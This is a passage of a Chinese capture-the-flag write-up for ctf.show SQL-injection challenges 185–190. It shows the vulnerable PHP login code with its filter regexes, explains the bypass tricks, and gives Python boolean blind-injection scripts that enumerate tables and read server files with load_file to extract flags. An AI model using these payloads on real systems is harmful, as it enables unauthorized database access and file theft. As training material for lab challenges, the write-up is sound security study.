class="string">f&quot;\r[-] 少女折寿中: <span class="subst">&#123;pd&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(make_payload(pd)):</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[+] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Over Sir!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="185-186-禁用了数字和引号，意味着174失效"><a href="#185-186-禁用了数字和引号，意味着174失效" class="headerlink" title="185-186(禁用了数字和引号，意味着174失效)"></a>185-186(禁用了数字和引号，意味着174失效)</h2><p><strong>有过滤的表名位置注入，这次过滤了所有数字，需要自己构造数字，char 转换数组成字符串。</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\##|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>



<h3 id="构造数字"><a href="#构造数字" class="headerlink" title="构造数字"></a>构造数字</h3><p>利用mysql的一些数学函数，构造出数字就行（由于本题还过滤了*，只能硬加了）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20210825152638568-614907953.png"
                      alt="image-20210813215236660"
                ></p>
<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d0c03a5a-c2a1-46a0-90f0-e7dd023f71ee.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line"><span class="comment">## sql的char()会把里面的数字按逗号依次换为字符，如：char(65,66,67) 就会是 abc ，所以就有了下面的 join操作</span></span><br><span class="line">judge = <span class="string">&quot;$user_count = 43;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numbermaker</span>(<span class="params">num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;+&quot;</span>.join(<span class="string">&quot;true&quot;</span> <span class="keyword">for</span> koishi <span class="keyword">in</span> <span class="built_in">range</span>(num))</span><br><span class="line">    <span class="comment">## join里面加上for，会循环执行join</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_maker</span>(<span class="params">pay: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>(<span class="string">&quot;,&quot;</span>.join(numbermaker(<span class="built_in">ord</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> pay))</span><br><span class="line">    <span class="comment">## 这个join 在处理数组时，会在每个字符之间添加前面引号的字符，而对于元组，会在元组的每个元素之间添加前面引号内的字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> judge <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfs&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">&quot;-&#123;&#125;&quot;</span> + string.digits + string.ascii_lowercase:</span><br><span class="line">        pd = flag + k</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[-]少女折寿中ing......  聪明⑨:<span class="subst">&#123;pd&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload_maker(pd)):</span><br><span class="line">            flag += k</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[+] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>



<h1 id="登录类——特性"><a href="#登录类——特性" class="headerlink" title="登录类——特性"></a>登录类——特性</h1><h2 id="187-绕过-md5-str-true"><a href="#187-绕过-md5-str-true" class="headerlink" title="187(  绕过 md5($str,true)  )"></a>187(  绕过 md5($str,true)  )</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于这种，使用特殊字符串payload：<strong>ffifdyop</strong>  即可绕过</p>
<h2 id="188（有过滤的数字型注入-数据库账号密码列名开头都是字符）"><a href="#188（有过滤的数字型注入-数据库账号密码列名开头都是字符）" class="headerlink" title="188（有过滤的数字型注入_数据库账号密码列名开头都是字符）"></a>188（有过滤的数字型注入_数据库账号密码列名开头都是字符）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询语句</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//返回逻辑</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><p>当列的类型为 string 时，在查询限制条件中使用数字会将字符串转为数字进行比较，非数字开头的字符串会被转化为数字 0</p>
<p>在比较查询的时候，查询语句为：<code>select pass from ctfshow_user where username = 0 and password = 0;</code>，由于<code>username password</code>是字符串，弱比较成了0,而0&#x3D;0成立，所条件就成立了；最后查询语句就成了：<code>select pass from ctfshow_user where 1;</code></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/mrsm1th/p/6745532.html" >php弱类型总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><strong>在 php 中，当一个字符串当作一个数值来取值，其结果和类型如下: 如果该字符串没有包含 ‘.’，’e’，’E’ 并且其数值值在整形的范围之内该字符串被当作 int 来取值，其他所有情况下都被作为 float 来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</strong></p>
<p><code>$row[&#39;pass&#39;]</code> 为 string 类型，若第一个字符不是数字就会被转换为数字 0。尝试在 password 填写数字 0，成功绕过。</p>
<p><strong>故本题账号密码都使用 0 即可</strong></p>
<h2 id="web189（数据库列名的开头不止一个是数字）"><a href="#web189（数据库列名的开头不止一个是数字）" class="headerlink" title="web189（数据库列名的开头不止一个是数字）"></a>web189（数据库列名的开头不止一个是数字）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>有过滤的数字型注入，尝试上一题的解法不能绕过，password <strong>不止第一个字符是数字</strong>，不能被转换为 0。<br>正则很多东西<strong>没有过滤</strong>，可以利用 username 筛选条件 0 和 1 的回显不同，读文件布尔盲注 flag（0是密码错误，1是查询失败）</p>
<h3 id="尝试写exp"><a href="#尝试写exp" class="headerlink" title="尝试写exp"></a>尝试写exp</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="comment">## 这里的url需要注意一下，题目说明flag在 /api/index.php中，所以我们不能傻乎乎的直接用 /select-waf.php ,之前写完脚本还一直不知道拿错了</span></span><br><span class="line">url = <span class="string">&quot;http://50df699d-c52e-4dce-8ef0-3ce85d9970eb.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"><span class="comment">## sql 的 locate 语句：返回字符串中第一次出现的子字符串的位置。   LOCATE(substring(需要查找的字符串), string(查找范围), start（可不填，默认字符串起始位置）)</span></span><br><span class="line"><span class="comment">## 使用 if 判断我们的flag字符串位置是否大于index（由于0，1页面返回值不同，我们可以利用这种方式布尔盲注）</span></span><br><span class="line">location_payload = <span class="string">&quot;if(locate(&#x27;ctfshow&#x27;,load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;index&#125;,0,1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 二分法查找flag的起始位置</span></span><br><span class="line">def <span class="title function_ invoke__">find_flag_index</span>() -&gt; <span class="keyword">int</span>:</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="title function_ invoke__">not</span> (<span class="title function_ invoke__">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) <span class="comment">// 2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: location_payload.<span class="title function_ invoke__">format</span>(index=p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.<span class="title function_ invoke__">post</span>(url, data=data)</span><br><span class="line">        <span class="comment">## \u5bc6\u7801\u9519\u8bef 是中文 ”密码错误“ 的unicode编码</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> in response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">return</span> end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[-] ⑨酱正在努力查找flag位置  =￣ω￣=&quot;</span>)</span><br><span class="line">flag_location = <span class="title function_ invoke__">find_flag_index</span>()</span><br><span class="line"><span class="keyword">print</span>(f<span class="string">&quot;[^_^] ⑨:本天才找到flag位置是：&#123;flag_location&#125;&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;c&quot;</span></span><br><span class="line">flag_location += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[-] ⑨酱正在努力注入获取flag确切值 ｡◕‿◕｡ &quot;</span>)</span><br><span class="line">injection_payload = <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,0,1)&quot;</span></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>] != <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="title function_ invoke__">not</span> (<span class="title function_ invoke__">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) <span class="comment">// 2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: injection_payload.<span class="title function_ invoke__">format</span>(flag_location, p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.<span class="title function_ invoke__">post</span>(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> in response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="title function_ invoke__">chr</span>(end)</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[(*o &gt;Д&lt;)o] flag是: &#123;flag&#125;&quot;</span>)</span><br><span class="line">    flag_location += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p><strong>脚本写的多少带点我都个人爱好 &#x3D; w &#x3D;</strong></p>
<h1 id="布尔盲注（莫得回显，淦！）"><a href="#布尔盲注（莫得回显，淦！）" class="headerlink" title="布尔盲注（莫得回显，淦！）"></a>布尔盲注（莫得回显，淦！）</h1><h2 id="190-这题账号也是数字开头的了"><a href="#190-这题账号也是数字开头的了" class="headerlink" title="190(这题账号也是数字开头的了)"></a>190(这题账号也是数字开头的了)</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">   <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">   <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//密码判断</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">     <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br></pre></td></tr></table></figure></div>



<p><strong>有过滤的字符型注入，没有给出过滤的正则表达式，在 username 处构造 payload 布尔盲注。</strong><br><strong>先查表名，再查列名，再用列名和表名构造 payload 查 flag。</strong></p>
<p><strong>由于是字符型注入，还是尝试万能密码 1’ or ‘1’&#x3D;’1，发现可以使用，回显   “密码错误”    与 “用户名不存在”  不同，可以尝试bool</strong>  </p>
<h3 id="exp编写-1"><a href="#exp编写-1" class="headerlink" title="exp编写"></a>exp编写</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5be0cea3-6e88-4794-8aa5-2dfcd4666080.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 表名 : ctfshow_fl0g ,  ctfshow_user</span></span><br><span class="line"><span class="comment">## payload = &quot;0&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 列名 id,f1ag,id,username,pass</span></span><br><span class="line"><span class="comment">## payload = &quot;0&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"></span><br><span class="line">judge = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





